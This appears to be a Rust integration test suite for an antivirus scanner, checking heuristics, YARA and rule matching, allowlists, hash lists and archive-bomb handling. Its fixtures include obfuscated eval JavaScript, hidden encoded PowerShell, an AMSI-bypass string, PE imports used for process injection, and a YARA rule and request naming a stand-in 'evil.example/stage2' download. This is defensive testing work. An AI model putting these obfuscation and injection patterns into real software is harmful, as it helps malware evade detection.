//! Engine behaviour the Python unit and integration tests checked (tests/
//! test_av_*.py, test_legacy_engines.py, test_scanner.py, test_integration.py,
//! test_remediation_and_crypto.py, test_native_parity.py) and no side-by-side
//! suite did: detection outcomes, heuristic verdicts, rule and YARA
//! semantics, allowlists, hash lists, archive depth and bombs, the vault, and
//! the legacy engines behind `guard scan` / `open` / `clean` / `watch`.
//! Output comparisons are goldens recorded from guard.py; properties the
//! Python tests asserted are asserted here too, so they hold for both builds.

mod common;

use std::path::{Path, PathBuf};

use common::fixtures::*;
use common::samples::{eicar, sample};
use common::*;
use serde_json::{json, Value};
use sha2::Digest;

const SUITE: &str = "engine";

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

fn sha256(b: &[u8]) -> String {
    hex(&sha2::Sha256::digest(b))
}

fn md5(b: &[u8]) -> String {
    hex(&md5::Md5::digest(b))
}

fn sha1_of(b: &[u8]) -> String {
    // sha1 is not a dev-dependency: list sha1 entries from the binary's own
    // `av hash` output instead
    let tmp = Tmp::new("sha1");
    let f = write(&tmp.join("f"), b);
    let out = guard(&["av", "hash", &s(&f)]).home(&tmp.join("home")).run();
    out.stdout
        .split_whitespace()
        .nth(1)
        .map(str::to_string)
        .unwrap_or_else(|| panic!("no sha1 in {}", out.stdout))
}

fn av(tmp: &Tmp, args: &[&str]) -> Guard {
    let mut a = vec!["av"];
    a.extend_from_slice(args);
    guard(&a).home(&tmp.join("home"))
}

fn norm(tmp: &Tmp) -> Norm {
    Norm::new().path(&tmp.path, "TMP")
}

/// The JSON report with the timing scrubbed, canonical and path-normalised.
fn report(out: &Out, n: &Norm) -> String {
    let mut v = parse_json(&out.stdout);
    v["summary"]["elapsed_sec"] = json!("<elapsed>");
    format!(
        "exit {}\n--- report\n{}",
        out.code,
        n.apply(&canon_json(&v))
    )
}

/// File name -> result object of a JSON report.
fn results(out: &Out) -> Vec<(String, Value)> {
    parse_json(&out.stdout)["results"]
        .as_array()
        .unwrap_or_else(|| panic!("no report: {}\n{}", out.stdout, out.stderr))
        .iter()
        .map(|r| {
            let p = r["path"].as_str().unwrap();
            let name = Path::new(p).file_name().unwrap().to_string_lossy();
            (name.into_owned(), r.clone())
        })
        .collect()
}

fn find(res: &[(String, Value)], name: &str) -> Option<Value> {
    res.iter().find(|(n, _)| n == name).map(|(_, v)| v.clone())
}

fn get(res: &[(String, Value)], name: &str) -> Value {
    find(res, name).unwrap_or_else(|| panic!("{name} not in the report"))
}

fn evil_pe(extra: &[u8]) -> Vec<u8> {
    build_pe_with(
        &[
            section(b"UPX0", EXEC | WRITE | READ, random_bytes(4096, 7)),
            section(b".rsrc", READ, vec![0; 64]),
        ],
        0x9000,
        &[
            b"VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0".as_slice(),
            extra,
        ]
        .concat(),
        0x10B,
        false,
    )
}

fn nest_zip(inner: &[u8], name: &str, levels: usize) -> Vec<u8> {
    let mut data = make_zip(&[(name, inner)], &[]);
    for i in 1..levels {
        data = make_zip(&[(format!("{name}-l{i}.zip").as_str(), &data)], &[]);
    }
    data
}

/// "|~|" split markers keep live strings out of this source (Guard scans its
/// own repository); they are removed at runtime.
fn u(s: &str) -> Vec<u8> {
    s.replace("|~|", "").into_bytes()
}

fn charcodes(n: usize, same: bool) -> String {
    (0..n)
        .map(|i| if same { 65 } else { 65 + i % 26 }.to_string())
        .collect::<Vec<_>>()
        .join(",")
}

fn obfuscated_js() -> Vec<u8> {
    format!(
        "{}eval(String.fromCharCode({}))",
        "_0x1a2b ".repeat(60),
        charcodes(40, false)
    )
    .into_bytes()
}

/// The script heuristics cases of test_av_heuristics.py.
fn script_cases() -> Vec<(&'static str, Vec<u8>)> {
    let blob = "QUJD".repeat(600);
    let ids = |n: usize| {
        (0..n)
            .map(|i| format!("_0x{i:04x}"))
            .collect::<Vec<_>>()
            .join(" ")
    };
    vec![
        ("s00-blob.js", format!("eval(atob('{blob}'))").into_bytes()),
        (
            "s01-datauri.js",
            format!("const img = 'data:image/png;base64,{blob}';").into_bytes(),
        ),
        ("s02-obf.js", ids(60).into_bytes()),
        ("s03-few.js", ids(10).into_bytes()),
        (
            "s04-charcode.js",
            format!("eval(String.fromCharCode({}))", charcodes(40, false)).into_bytes(),
        ),
        (
            "s05-charcode-noexec.js",
            format!("String.fromCharCode({})", charcodes(40, true)).into_bytes(),
        ),
        ("s06-hex.js", "\\x41".repeat(400).into_bytes()),
        (
            "s07-hex-diluted.js",
            format!("{}{}", "\\x41".repeat(400), "A".repeat(10000)).into_bytes(),
        ),
        (
            "s08-enc.ps1",
            format!("powershell -enc {}", "A".repeat(120)).into_bytes(),
        ),
        (
            "s09-enc-hidden.ps1",
            format!("powershell -w hidden -EncodedCommand {}", "A".repeat(120)).into_bytes(),
        ),
        (
            "s10-hidden.ps1",
            b"powershell -w hidden -c Get-Date".to_vec(),
        ),
        (
            "s11-decode.ps1",
            u("I|~|EX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64|~|String($p)))"),
        ),
        (
            "s12-convert.ps1",
            b"[Convert]::FromBase64String($p)".to_vec(),
        ),
        (
            "s13-amsi.ps1",
            u("x = 'Amsi' + 'ScanBuffer'; Amsi|~|ScanBuffer"),
        ),
        ("s14-print.py", b"print('hello world')".to_vec()),
    ]
}

/// PE / ELF / Mach-O shapes of test_av_heuristics.py and the parity corpus of
/// test_native_parity.py.
fn binaries() -> Vec<(&'static str, Vec<u8>)> {
    let pe = |sections: &[Section], entry: u32, extra: &[u8], dll: bool| {
        build_pe_with(sections, entry, extra, 0x10B, dll)
    };
    vec![
        ("b00-ok.exe", build_pe()),
        (
            "b01-antidebug.exe",
            pe(
                &[
                    section(b".text", EXEC | READ | CODE, vec![0x90; 512]),
                    section(b".data", READ | WRITE, vec![0; 512]),
                ],
                0x1000,
                b"IsDebuggerPresent\0CheckRemoteDebuggerPresent\0",
                false,
            ),
        ),
        ("b02-malformed.exe", [b"MZ".as_slice(), &[0u8; 100]].concat()),
        (
            "b03-full-injector.exe",
            evil_pe(
                b"NtUnmapViewOfSection\0SetThreadContext\0ResumeThread\0SetWindowsHookExA\0GetAsyncKeyState\0",
            ),
        ),
        (
            "b04-entry-data.exe",
            pe(
                &[
                    section(b".text", EXEC | CODE | READ, vec![0x90; 64]),
                    section(b".data", READ | WRITE, vec![0; 64]),
                ],
                0x2000,
                b"",
                false,
            ),
        ),
        (
            "b05-resource.dll",
            pe(
                &[
                    section(b".text", EXEC | READ | CODE, vec![0x90; 512]),
                    section(b".data", READ | WRITE, vec![0; 512]),
                ],
                0,
                b"",
                true,
            ),
        ),
        ("b06-nosections.exe", pe(&[], 0x1000, b"", false)),
        (
            "b07-small-entropy.exe",
            pe(
                &[section(b".text", EXEC | CODE, random_bytes(512, 11))],
                0x1000,
                b"",
                false,
            ),
        ),
        (
            "b08-odd-section.exe",
            pe(
                &[
                    section(b"UPX0", EXEC | WRITE | READ, random_bytes(4096, 7)),
                    section(b".r'\x01\xad", READ, vec![0; 64]),
                ],
                0x9000,
                b"VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0",
                false,
            ),
        ),
        (
            "b09-entry-outside.dll",
            pe(
                &[section(b".text", EXEC | CODE, vec![0x90; 64])],
                0x5000,
                b"",
                true,
            ),
        ),
        (
            "b10-noncode.exe",
            pe(&[section(b".data", READ, vec![0; 64])], 0x1000, b"", false),
        ),
        (
            "b11-pe64.exe",
            build_pe_with(
                &[
                    section(b".text", EXEC | READ | CODE, vec![0x90; 512]),
                    section(b".data", READ | WRITE, vec![0; 512]),
                ],
                0x1000,
                b"",
                0x20B,
                false,
            ),
        ),
        ("b12-zeros.so", build_elf(&[0u8; 64])),
        (
            "b13-packed.so",
            build_elf(
                &[
                    b"UPX!".as_slice(),
                    &random_bytes(8192, 5),
                    b"/etc/ld.so.preload",
                ]
                .concat(),
            ),
        ),
        (
            "b14-tail-packed.so",
            build_elf(&[vec![0u8; 9000], b"UPX!".to_vec()].concat()),
        ),
        (
            "b15-zeros.dylib",
            [b"\xcf\xfa\xed\xfe".as_slice(), &[0u8; 5000]].concat(),
        ),
        (
            "b16-random.dylib",
            [b"\xcf\xfa\xed\xfe".as_slice(), &random_bytes(5000, 9)].concat(),
        ),
        ("b17-holiday.jpg", build_pe()),
    ]
}

// ------------------------------------------------------------ the pipeline
/// test_av_engine.py TestPipeline / TestCache, the heuristics shapes and the
/// parity corpus, scanned in one report.
#[test]
fn pipeline_corpus() {
    let tmp = Tmp::new("pipeline");
    let d = tmp.join("c");
    let e = eicar();
    write(&d.join("offset-eicar.txt"), [b"x".as_slice(), &e].concat());
    write(&d.join("obf.js"), obfuscated_js());
    write(
        &d.join("bomb-only.zip"),
        make_zip(&[("zeros", &vec![0u8; 4 * 1024 * 1024])], &[]),
    );
    // archives are unpacked three levels deep (distinct member names: the
    // result cache is keyed by content and name, not depth, in both builds)
    write(&d.join("depth3.zip"), nest_zip(&e, "e3.com", 3));
    write(&d.join("depth4.zip"), nest_zip(&e, "e4.com", 4));
    write(
        &d.join("bundle.tgz"),
        gz(&make_tar(&[
            (
                "inner.zip",
                &make_zip(&[("payload/eicar.com", &e), ("clean.txt", b"hello")], &[]),
            ),
            ("readme.md", b"# hi"),
        ])),
    );
    // the result cache is keyed by content and name: a name that is
    // suspicious on its own is not answered from a clean twin's entry
    write(&d.join("a.exe"), build_pe());
    write(&d.join("r\u{202e}fdp.pdf.exe"), build_pe());
    write(&d.join("svch0st.exe"), evil_pe(b""));
    write(
        &d.join("ps.ps1"),
        format!(
            "powershell -w hidden -enc {} IEX FromBase64String",
            "A".repeat(120)
        ),
    );
    write(
        &d.join("blob.js"),
        format!("eval(x);{}", "QUJD".repeat(600)),
    );
    write(
        &d.join("obf2.js"),
        format!(
            "{}eval(String.fromCharCode({}))",
            "_0x1a2b ".repeat(60),
            charcodes(40, true)
        ),
    );
    write(&d.join("z.zip"), make_zip(&[("a", b"b")], &[]));
    write(&d.join("empty"), b"");
    for (n, data) in script_cases().into_iter().chain(binaries()) {
        write(&d.join(n), data);
    }

    let out = av(&tmp, &["scan", &s(&d), "--json"]).run();
    assert_eq!(out.code, 1, "{}", out.stderr);
    let res = results(&out);
    assert!(
        find(&res, "offset-eicar.txt").is_none(),
        "EICAR off offset 0"
    );
    let obf = get(&res, "obf.js");
    assert_eq!(obf["verdict"], "suspicious");
    assert!(obf["threat"]
        .as_str()
        .unwrap()
        .starts_with("Heur.Suspicious."));
    let bomb = get(&res, "bomb-only.zip");
    assert_eq!(
        (bomb["verdict"].as_str(), bomb["threat"].as_str()),
        (Some("suspicious"), Some("Archive.Bomb"))
    );
    assert_eq!(get(&res, "depth3.zip")["verdict"], "malicious");
    assert!(find(&res, "depth4.zip").is_none(), "unpacked past depth 3");
    let tgz = get(&res, "bundle.tgz");
    assert_eq!(tgz["threat"], "EICAR-Test-File");
    assert_eq!(tgz["action"], "quarantine");
    let kid = &tgz["children"][0];
    assert!(kid["path"]
        .as_str()
        .unwrap()
        .ends_with("bundle.tgz!inner.zip"));
    assert!(kid["children"][0]["path"]
        .as_str()
        .unwrap()
        .ends_with("bundle.tgz!inner.zip!payload/eicar.com"));
    assert!(find(&res, "a.exe").is_none());
    assert!(get(&res, "r\u{202e}fdp.pdf.exe")["heuristic_score"].as_u64() > Some(0));
    let pe = get(&res, "svch0st.exe");
    assert!(pe["threat"].as_str().unwrap().starts_with("Heur.Malware."));
    assert!(pe["heuristic_score"].as_u64() >= Some(150));
    assert_eq!(pe["action"], "quarantine");
    for clean in [
        "b00-ok.exe",
        "b01-antidebug.exe",
        "b12-zeros.so",
        "s14-print.py",
    ] {
        assert!(find(&res, clean).is_none(), "{clean} flagged");
    }
    golden(SUITE, "pipeline_corpus", &report(&out, &norm(&tmp)));
}

// --------------------------------------------------------------- allowlists
fn allowlisted_corpus(d: &Path) {
    write(&d.join("fixtures/eicar"), eicar());
    write(&d.join("a.php"), sample("webshell_eval.php"));
    write(
        &d.join("b.zip"),
        make_zip(&[("z", &vec![0u8; 4 * 1024 * 1024])], &[]),
    );
    write(&d.join("m.json"), sample("miner.json"));
    write(&d.join("x.exe"), evil_pe(b""));
}

/// test_av_engine.py allowlist tests and test_av_core.py TestAllowlist: by
/// path, by (upper-case) hash, by rule id, by threat name, by heuristic name.
#[test]
fn allowlist_entries() {
    let tmp = Tmp::new("allowlist");
    let d = tmp.join("c");
    allowlisted_corpus(&d);
    let sigs = tmp.join("sigs");
    write(
        &sigs.join("allowlist-team.json"),
        json!({"sha256": [sha256(&sample("miner.json")).to_uppercase()],
               "paths": ["*/fixtures/*"],
               "rules": ["Archive.Bomb", "webshell.php.superglobal-exec",
                         "Heur.Malware.pe.api.process-injection"]})
        .to_string(),
    );
    let without = av(&tmp, &["scan", &s(&d), "--json"]).run();
    assert_eq!(results(&without).len(), 5, "{}", without.stdout);
    let with = av(&tmp, &["scan", &s(&d), "--json", "--signatures", &s(&sigs)]).run();
    assert_eq!(with.code, 0, "{}", with.stdout);
    assert!(results(&with).is_empty(), "{}", with.stdout);
    let n = norm(&tmp);
    golden(
        SUITE,
        "allowlist_entries",
        &format!(
            "{}=== allowlisted\n{}",
            report(&without, &n),
            report(&with, &n)
        ),
    );
}

// -------------------------------------------------------------- hash lists
/// test_av_core.py TestHashDatabase through signature files: sha256 wins over
/// md5, digests in any case, default names, comments, a sha1 entry.
#[test]
fn hash_lists() {
    let tmp = Tmp::new("hashes");
    let d = tmp.join("c");
    let files: [(&str, &[u8]); 5] = [
        ("both", b"evil"),
        ("named", b"trojan-x"),
        ("bare", b"bare-md5"),
        ("unnamed", b"no-name"),
        ("bysha1", b"sha1-listed"),
    ];
    for (n, data) in files {
        write(&d.join(n), data);
    }
    let sigs = tmp.join("sigs");
    write(
        &sigs.join("hashes-a.txt"),
        format!(
            "# comment\n\n{}  Trojan.X  # trailing\n{}\nnot-a-hash Foo\n{} ByMd5\n",
            sha256(b"trojan-x"),
            md5(b"bare-md5"),
            md5(b"evil")
        ),
    );
    write(
        &sigs.join("hashes-b.json"),
        json!({"entries": [
            {"sha256": sha256(b"evil").to_uppercase(), "name": "BySha", "verdict": "suspicious"},
            {"md5": md5(b"no-name")},
            {"sha1": sha1_of(b"sha1-listed"), "name": "BySha1"},
        ]})
        .to_string(),
    );
    let out = av(&tmp, &["scan", &s(&d), "--json", "--signatures", &s(&sigs)]).run();
    let res = results(&out);
    let threat = |n: &str| {
        let r = get(&res, n);
        format!(
            "{} {}",
            r["threat"].as_str().unwrap(),
            r["verdict"].as_str().unwrap()
        )
    };
    assert_eq!(threat("both"), "BySha suspicious");
    assert_eq!(threat("named"), "Trojan.X malicious");
    assert_eq!(threat("bare"), "Hash.Blocklisted malicious");
    assert_eq!(threat("unnamed"), "Unnamed malicious");
    assert_eq!(threat("bysha1"), "BySha1 malicious");
    golden(SUITE, "hash_lists", &report(&out, &norm(&tmp)));
}

/// A malicious rule hit in a source file is quarantined like any other hit:
/// there is no review state (was test_av_engine.py test_action_hint_cases).
#[test]
fn source_file_hit_is_quarantined() {
    let tmp = Tmp::new("review");
    let shell = sample("webshell_eval.php");
    let f = write(&tmp.join("c/index.php"), &shell);
    let sigs = tmp.join("sigs");
    write(
        &sigs.join("hashes-x.json"),
        json!({"entries": [{"sha256": sha256(&shell), "name": "Listed", "verdict": "suspicious"}]})
            .to_string(),
    );
    let out = av(&tmp, &["scan", &s(&f), "--json", "--signatures", &s(&sigs)]).run();
    let r = get(&results(&out), "index.php");
    assert_eq!(
        (r["verdict"].as_str(), r["action"].as_str()),
        (Some("malicious"), Some("quarantine"))
    );
    golden(
        SUITE,
        "source_file_hit_is_quarantined",
        &report(&out, &norm(&tmp)),
    );
}

// ----------------------------------------------------- user signature dirs
/// --signatures and ~/.guard/av both load; signature files never flag
/// themselves (test_av_engine.py test_load_dir_user_signatures,
/// test_scan_extra_signatures_and_guard_home).
#[test]
fn user_signatures_and_guard_home() {
    let tmp = Tmp::new("user-sigs");
    let marker = concat!("zz", "marker");
    let sigs = tmp.join("sigs");
    write(
        &sigs.join("rules-extra.json"),
        json!({"rules": [{"id": "u", "name": "User.Rule",
                          "strings": {"$a": {"text": marker}}, "condition": "$a"}]})
        .to_string(),
    );
    write(
        &sigs.join("hashes-extra.txt"),
        format!("{} Team.Bad\n", sha256(b"team-bad")),
    );
    write(
        &sigs.join("allowlist-team.json"),
        json!({"paths": ["*/trusted/*"]}).to_string(),
    );
    write(
        &tmp.join("home/av/hashes.txt"),
        format!("{} Home.Bad\n", sha256(b"home-bad")),
    );
    let d = tmp.join("t");
    write(&d.join("a"), b"team-bad");
    write(&d.join("b"), b"home-bad");
    write(&d.join("c"), format!("..{marker}.."));
    write(&d.join("trusted/e"), eicar());
    let out = av(
        &tmp,
        &[
            "scan",
            &s(&d),
            &s(&sigs),
            "--json",
            "--signatures",
            &s(&sigs),
        ],
    )
    .run();
    let res = results(&out);
    let names: Vec<&str> = res
        .iter()
        .map(|(_, r)| r["threat"].as_str().unwrap())
        .collect();
    assert_eq!(
        names,
        ["Team.Bad", "Home.Bad", "User.Rule"],
        "{}",
        out.stdout
    );
    golden(
        SUITE,
        "user_signatures_and_guard_home",
        &report(&out, &norm(&tmp)),
    );
}

// --------------------------------------------------------------------- YARA
const YARA: &str = r#"
rule DropperMarker : dropper {
    meta:
        verdict = "malicious"
        whole_file = true
        description = "drops the second stage"
    strings:
        $url = "evil.example/stage2"
        $mz = { 4D 5A 90 00 }
    condition:
        any of them
}

rule LooseHunt : hunting research {
    meta:
        verdict = "nonsense"
    strings:
        $a = "hunting-marker"
    condition:
        $a
}

rule ClaimsClean {
    meta:
        verdict = "clean"
        whole_file = "yes"
    condition:
        filesize == 13
}

private rule helper { condition: true }
"#;

/// test_av_yara.py: verdict / whole_file / description metadata, the
/// suspicious default, tags as the description, `yara:<file>.<rule>`
/// allowlist entries, rule files never flagged, the rule count.
#[test]
fn yara_metadata_and_allowlist() {
    let tmp = Tmp::new("yara");
    let sigs = tmp.join("sigs");
    write(&sigs.join("community.yar"), YARA);
    write(&sigs.join("notes.txt"), "not a rule file");
    let d = tmp.join("c");
    write(
        &d.join("drop.txt"),
        "GET http://evil.example/stage2 HTTP/1.1",
    );
    write(&d.join("hunt.txt"), "..hunting-marker..");
    write(&d.join("thirteen.txt"), "thirteen byte");
    let scan = |sigs: &Path| {
        av(
            &tmp,
            &["scan", &s(&d), &s(sigs), "--json", "--signatures", &s(sigs)],
        )
        .run()
    };
    let out = scan(&sigs);
    let res = results(&out);
    let yara = |n: &str| -> Value {
        let r = get(&res, n);
        r["detections"]
            .as_array()
            .unwrap()
            .iter()
            .find(|d| d["engine"] == "yara")
            .unwrap_or_else(|| panic!("no YARA hit on {n}"))
            .clone()
    };
    let drop = yara("drop.txt");
    assert_eq!(drop["rule_id"], "yara:community.DropperMarker");
    assert_eq!(
        (drop["verdict"].as_str(), drop["whole_file"].as_bool()),
        (Some("malicious"), Some(true))
    );
    assert_eq!(drop["description"], "drops the second stage");
    assert_eq!(drop["evidence"], "$url@11: evil.example/stage2 HTTP/1.1");
    let hunt = yara("hunt.txt");
    assert_eq!(
        (
            hunt["verdict"].as_str(),
            hunt["description"].as_str(),
            hunt["whole_file"].as_bool()
        ),
        (Some("suspicious"), Some("hunting research"), Some(false))
    );
    let clean = yara("thirteen.txt");
    assert_eq!(
        (
            clean["verdict"].as_str(),
            clean["evidence"].as_str(),
            clean["whole_file"].as_bool()
        ),
        (Some("suspicious"), Some(""), Some(false))
    );
    // the rule file itself is never flagged
    assert!(find(&res, "community.yar").is_none());

    let off = tmp.join("sigs-off");
    copy_tree(&sigs, &off);
    write(
        &off.join("allowlist-x.json"),
        json!({"rules": ["yara:community.DropperMarker"]}).to_string(),
    );
    let quiet = scan(&off);
    assert!(
        find(&results(&quiet), "drop.txt").is_none(),
        "{}",
        quiet.stdout
    );
    let validate = av(
        &tmp,
        &["rules", "--validate", &s(&sigs.join("community.yar"))],
    )
    .run();
    assert!(validate.stdout.contains("4 rule(s)"), "{}", validate.stdout);
    let n = norm(&tmp);
    golden(
        SUITE,
        "yara_metadata_and_allowlist",
        &format!(
            "{}=== allowlisted\n{}=== validate\n{}",
            report(&out, &n),
            report(&quiet, &n),
            n.apply(&validate.shown())
        ),
    );
}

/// A YARA file that does not compile stops the scan, naming the file.
#[test]
fn broken_yara_in_signatures() {
    let tmp = Tmp::new("yara-broken");
    let sigs = tmp.join("bad");
    write(
        &sigs.join("broken.yara"),
        "rule broken { condition: $missing }",
    );
    let out = av(&tmp, &["scan", &s(&tmp.path), "--signatures", &s(&sigs)]).run();
    assert_ne!(out.code, 0);
    assert!(out.stdout.is_empty(), "{}", out.stdout);
    assert!(out.stderr.contains("broken.yara"), "{}", out.stderr);
}

// ------------------------------------------------------------------- rules
fn rule(id: &str, cond: Value, strings: Value, extra: Value) -> Value {
    let mut r = json!({"id": id, "name": format!("R.{id}"), "condition": cond, "strings": strings});
    for (k, v) in extra.as_object().unwrap() {
        r[k] = v.clone();
    }
    r
}

/// test_av_rules.py semantics through a rules file (a bare list): filters,
/// type groups, the per-string match cap, regex flags, evidence, verdicts.
#[test]
fn rule_semantics() {
    let tmp = Tmp::new("rules");
    let t = |s: &str| json!({"$a": {"text": s}});
    let rules = json!([
        rule(
            "size",
            json!("$a"),
            t("maxmark"),
            json!({"max_filesize": 10})
        ),
        rule(
            "ext",
            json!("$a"),
            t("exclmark"),
            json!({"exclude_extensions": [".MD"]})
        ),
        rule(
            "exec",
            json!({"filesize_min": 0}),
            json!({}),
            json!({"filetypes": ["executable"]})
        ),
        rule(
            "arch",
            json!({"filesize_min": 0}),
            json!({}),
            json!({"filetypes": ["archive"]})
        ),
        rule(
            "script",
            json!("$a"),
            t("scriptmark"),
            json!({"filetypes": ["script"]})
        ),
        rule(
            "textual",
            json!("$a"),
            t("textmark"),
            json!({"filetypes": ["textual"]})
        ),
        rule(
            "cap64",
            json!({"count": "$a", "min": 64}),
            t("capmark"),
            json!({})
        ),
        rule(
            "cap65",
            json!({"count": "$a", "min": 65}),
            t("capmark"),
            json!({})
        ),
        rule(
            "evid",
            json!("$x"),
            json!({"$x": {"text": "evil\u{1}"}}),
            json!({"whole_file": true})
        ),
        rule(
            "nostr",
            json!({"and": [{"filesize_min": 777}, {"filesize_max": 777}]}),
            json!({}),
            json!({"verdict": " Suspicious "})
        ),
        rule(
            "ml",
            json!("$r"),
            json!({"$r": {"regex": "^mlmark", "multiline": true}}),
            json!({})
        ),
        rule(
            "noml",
            json!("$r"),
            json!({"$r": {"regex": "^nomlmark"}}),
            json!({})
        ),
        rule(
            "dot",
            json!("$r"),
            json!({"$r": {"regex": "dot.mark", "dotall": true}}),
            json!({})
        ),
        rule(
            "nodot",
            json!("$r"),
            json!({"$r": {"regex": "nod.mark"}}),
            json!({})
        ),
        rule(
            "nocase",
            json!("$a"),
            json!({"$a": {"text": "CaseMark", "nocase": true}}),
            json!({})
        ),
        rule(
            "wide",
            json!("$w"),
            json!({"$w": {"text": "widemk", "wide": true, "ascii": false}}),
            json!({})
        ),
        rule(
            "at",
            json!({"at": "$a", "offset": 5}),
            t("atmark"),
            json!({})
        ),
        rule(
            "quorum",
            json!({"at_least": 2, "of": ["$c*"]}),
            json!({"$c1": {"text": "q-one"}, "$c2": {"text": "q-two"}, "$c3": {"text": "q-three"}}),
            json!({})
        ),
        rule(
            "not",
            json!({"and": ["$a", {"not": "$b"}]}),
            json!({"$a": {"text": "notmark"}, "$b": {"text": "veto"}}),
            json!({})
        ),
        rule(
            "hex",
            json!("$h"),
            json!({"$h": {"hex": "6d6b [2] 2E (41|42)"}}),
            json!({})
        ),
    ]);
    let sigs = tmp.join("sigs");
    write(&sigs.join("rules-list.json"), rules.to_string());
    let d = tmp.join("c");
    write(&d.join("small.txt"), "maxmark");
    write(&d.join("big.txt"), "maxmark and more");
    write(&d.join("doc.md"), "exclmark");
    write(&d.join("doc.txt"), "exclmark");
    write(&d.join("tool"), build_elf(&[0u8; 32]));
    write(&d.join("a.zip"), make_zip(&[("x", b"y")], &[]));
    write(&d.join("run.sh"), "#!/bin/sh\nscriptmark\n");
    write(&d.join("plain.txt"), "scriptmark textmark\n");
    write(&d.join("page.php"), "<?php // textmark\n");
    write(
        &d.join("bin.exe"),
        [build_pe(), b"textmark".to_vec()].concat(),
    );
    write(&d.join("cap.txt"), "capmark ".repeat(100));
    write(&d.join("evid.txt"), "xx evil\u{1} yy");
    write(&d.join("size777.txt"), "s".repeat(777));
    write(&d.join("ml.txt"), "first\nmlmark\nnomlmark later\n");
    write(&d.join("dot.txt"), "dot\nmark nod\nmark\n");
    write(&d.join("case.txt"), "CASEMARK");
    write(
        &d.join("wide.dat"),
        "widemk"
            .encode_utf16()
            .flat_map(u16::to_le_bytes)
            .collect::<Vec<u8>>(),
    );
    write(&d.join("ascii.dat"), "widemk");
    write(&d.join("at.txt"), "12345atmark atmark");
    write(&d.join("at-off.txt"), "1234atmark");
    write(&d.join("quorum.txt"), "q-one q-three");
    write(&d.join("quorum1.txt"), "q-two");
    write(&d.join("not.txt"), "notmark");
    write(&d.join("veto.txt"), "notmark veto");
    write(&d.join("hex.txt"), "mk...B");
    write(&d.join("hex-no.txt"), "mkxx.xB");
    let out = av(&tmp, &["scan", &s(&d), "--json", "--signatures", &s(&sigs)]).run();
    let res = results(&out);
    let hits = |n: &str| -> Vec<String> {
        find(&res, n)
            .map(|r| {
                r["detections"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .filter(|d| d["engine"] == "rule")
                    .map(|d| d["rule_id"].as_str().unwrap().to_string())
                    .collect()
            })
            .unwrap_or_default()
    };
    let want: &[(&str, &[&str])] = &[
        ("small.txt", &["size"]),
        ("big.txt", &[]),
        ("doc.md", &[]),
        ("doc.txt", &["ext"]),
        ("tool", &["exec"]),
        ("a.zip", &["arch"]),
        ("run.sh", &["script"]),
        ("plain.txt", &["textual"]),
        ("page.php", &["textual"]),
        ("cap.txt", &["cap64"]),
        ("evid.txt", &["evid"]),
        ("size777.txt", &["nostr"]),
        ("ml.txt", &["ml"]),
        ("dot.txt", &["dot"]),
        ("case.txt", &["nocase"]),
        ("wide.dat", &["wide"]),
        ("ascii.dat", &[]),
        ("at.txt", &["at"]),
        ("at-off.txt", &[]),
        ("quorum.txt", &["quorum"]),
        ("quorum1.txt", &[]),
        ("not.txt", &["not"]),
        ("veto.txt", &[]),
        ("hex.txt", &["hex"]),
        ("hex-no.txt", &[]),
    ];
    for (n, ids) in want {
        assert_eq!(hits(n), *ids, "{n}");
    }
    assert!(!hits("bin.exe").contains(&"textual".to_string()));
    let ev = &get(&res, "evid.txt")["detections"][0];
    assert_eq!(
        (
            ev["evidence"].as_str(),
            ev["whole_file"].as_bool(),
            ev["verdict"].as_str()
        ),
        (Some("$x@3: evil. yy"), Some(true), Some("malicious"))
    );
    let ns = &get(&res, "size777.txt")["detections"][0];
    assert_eq!(
        (ns["evidence"].as_str(), ns["verdict"].as_str()),
        (Some(""), Some("suspicious"))
    );
    golden(SUITE, "rule_semantics", &report(&out, &norm(&tmp)));
}

/// More of test_av_rules.py's validation errors, through `rules --validate`.
#[test]
fn rules_validate_more() {
    let tmp = Tmp::new("validate");
    let a = json!({"$a": {"text": "a"}});
    let defs = json!({"$a": {"text": "a"}, "$b": {"text": "b"}, "$c1": {"text": "c"}, "$c2": {"text": "d"}});
    let r = |cond: Value, strings: &Value| json!({"id": "x", "name": "n", "condition": cond, "strings": strings});
    let cases: Vec<(&str, Value)> = vec![
        (
            "ascii-off",
            r(json!("$a"), &json!({"$a": {"text": "x", "ascii": false}})),
        ),
        (
            "unterminated",
            r(json!("$a"), &json!({"$a": {"hex": "41 [2-"}})),
        ),
        ("oddhex", r(json!("$a"), &json!({"$a": {"hex": "4"}}))),
        ("emptyhex", r(json!("$a"), &json!({"$a": {"hex": ""}}))),
        ("close", r(json!("$a"), &json!({"$a": {"hex": "41 )"}}))),
        ("emptycond", r(json!({}), &a)),
        ("orstr", r(json!({"or": "x"}), &a)),
        ("atwild", r(json!({"at": "$c*", "offset": 0}), &defs)),
        ("atstr", r(json!({"at": "$a", "offset": "0"}), &a)),
        ("nomin", r(json!({"count": "$a"}), &a)),
        ("countundef", r(json!({"count": "$q", "min": 1}), &a)),
        ("sizestr", r(json!({"filesize_max": "1"}), &a)),
        ("notundef", r(json!({"not": "$nope"}), &a)),
        ("allwild", r(json!({"all": ["$q*"]}), &a)),
    ];
    let mut files = vec![];
    for (name, body) in &cases {
        files.push(s(&write(
            &tmp.join(format!("rules-{name}.json")),
            json!({"rules": [body]}).to_string(),
        )));
    }
    // a bare list, and every valid condition form of test_validate_ok
    let ok: Vec<Value> = [
        json!("$a"),
        json!({"all": "them"}),
        json!({"any": ["$a", "$b"]}),
        json!({"at_least": 2, "of": ["$c*"]}),
        json!({"at_least": 1}),
        json!({"and": ["$a", {"not": "$b"}]}),
        json!({"or": ["$a"]}),
        json!({"at": "$a", "offset": 0}),
        json!({"count": "$a", "min": 2}),
        json!({"filesize_max": 10}),
        json!({"filesize_min": 1}),
    ]
    .into_iter()
    .enumerate()
    .map(|(i, c)| json!({"id": format!("ok{i}"), "name": "n", "condition": c, "strings": defs}))
    .collect();
    files.push(s(&write(
        &tmp.join("rules-ok.json"),
        Value::Array(ok).to_string(),
    )));
    let mut args = vec!["rules", "--validate"];
    args.extend(files.iter().map(String::as_str));
    let out = av(&tmp, &args).run();
    assert_eq!(out.code, 2);
    golden(
        SUITE,
        "rules_validate_more",
        &norm(&tmp).apply(&out.shown()),
    );
}

/// Where the builds differ on purpose: rule regexes compile with Rust's regex
/// engine, which has no look-around (guard_av fell back to Python's re for
/// those) and words its syntax errors its own way. Binary only.
